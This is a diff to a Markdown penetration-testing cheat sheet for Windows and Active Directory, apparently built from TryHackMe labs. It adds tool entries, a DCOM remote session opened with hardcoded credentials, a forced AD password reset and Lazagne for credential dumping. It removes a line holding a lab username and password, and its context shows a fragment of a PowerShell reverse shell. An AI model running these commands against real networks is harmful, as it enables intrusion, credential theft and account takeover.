@@ -10,6 +10,12 @@
 - [ssh](#ssh)
 - [socat](#socat)
 - [TFTP](#tftp)
+- [scp](#scp)
+- [nmap](#nmap)
+- [fping](#fping)
+- [tcpdump](#tcpdump)
+- [Responser](#responder)
+- [ffuf](#ffuf)
 - [nc](#nc)
 - [Windows Built-In](#windows-built-in)
 - [Powerview](#powerview)
@@ -29,10 +35,10 @@
 https://github.com/GhostPack/Seatbelt  
 https://github.com/funoverip/mcafee-sitelist-pwd-decryption  
 https://github.com/wavestone-cdt/powerpxe/blob/master/PowerPXE.ps1  
-https://github.com/wavestone-cdt/powerpxe/tree/master
-https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/
-https://github.com/cube0x0/CVE-2021-1675/tree/main
-https://pypi.org/project/requests-ntlm/
+https://github.com/wavestone-cdt/powerpxe/tree/master  
+https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/  
+https://github.com/cube0x0/CVE-2021-1675/tree/main  
+https://pypi.org/project/requests-ntlm/  
 
 ---
 
@@ -199,6 +205,8 @@ PS> powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('172.1
 PS> Get-WmiObject Win32_UserAccount | Select-Object Name, SID
 # List SIDs for local groups
 PS> Get-WmiObject Win32_Group | Select-Object Name, SID
+# privilege check
+PS> whoami /priv
 # Service
 PS> Get-Service
 PS> Get-Service | ? {$_.DisplayName -like "*Hoge*"}
@@ -210,6 +218,13 @@ PS> Get-Service -Name HogeService | fl
 # Share
 PS> Get-WmiObject Win32_Share | Select-Object Name, Path
 PS> Get-SmbShare | Select-Object Name, Path
+# Shell
+PS> $username = 'TestUser'
+PS> $password = 'TestPassword'
+PS> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+PS> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+PS> $Opt = New-CimSessionOption -Protocol DCOM
+PS> $Session =  New-Cimsession -ComputerName TestComputerHost.HOGE.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
 # Memo
 PS> if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrators")) { Start-Process powershell.exe "-File `"$PSCommandPath`"" -Verb RunAs; exit }
 ```
@@ -226,8 +241,9 @@ PS> Get-ADUser -Identity TestUser -Properties *
 PS> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
 # Group
 PS> Get-ADGroup -Identity "Enterprise Admins" -Properties * | Out-String | Select-String sid
-#
-PS> $Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force; Set-ADAccountPassword -Identity "TargetUser" -Reset -NewPassword $Password
+# Change Password
+PS> $Password = ConvertTo-SecureString "NewTestPassword" -AsPlainText -Force
+PS> Set-ADAccountPassword -Identity "TargetUser" -Reset -NewPassword $Password
 ```
 ## sc.exe
 ```powershell
@@ -535,6 +551,7 @@ PS> BloodHound.exe
 
 
 # Snaffer  
+tag: scan
 https://github.com/SnaffCon/Snaffler  
 ```powershell
 PS> Snaffler.exe -s -d hoge.local -o snaffler.log -v data
@@ -638,9 +655,6 @@ SpoolSample.exe THMSERVER2.za.tryhackme.loc "10.200.83.201"
 
 
 
-$ Set-ADAccountPassword -Identity "t2_june.russell" -Reset -NewPassword $Password
-$ $username = 't1_corine.waters'; $password = 'Korine.1994'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = $ New-Object System.Management.Automation.PSCredential $username, $securePassword; $Opt = New-CimSessionOption -Protocol DCOM; $Session =  New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
-
 $ $ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00)
 $ Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server za.tryhackme.com
 
@@ -650,7 +664,6 @@ SharpHound.exe --CollectionMethods All --Domain HOGE.com --ExcludeDCs
 
 # LDAP Pass-back Attacks
 ```zsh
-
 $ sudo dpkg-reconfigure -p low slapd
 ```
 - olcSaslSecProps.ldif
@@ -662,7 +675,11 @@ olcSaslSecProps: noanonymous,minssf=0,passcred
 ```
 
 # Seatbelt
+tag: scan
 https://github.com/GhostPack/Seatbelt
+
+# Lazagne
+tag: scan
 
 # sslstrip
 https://github.com/moxie0/sslstrip
@@ -759,3 +776,5 @@ $ python3 windapsearch.py --dc-ip 172.16.5.5 -u TestSpnAccountUser -p TestSpnAcc
 ```zsh
 $ git clone https://github.com/Ridter/noPac
 ```
+
+# SharpGPOAbuse
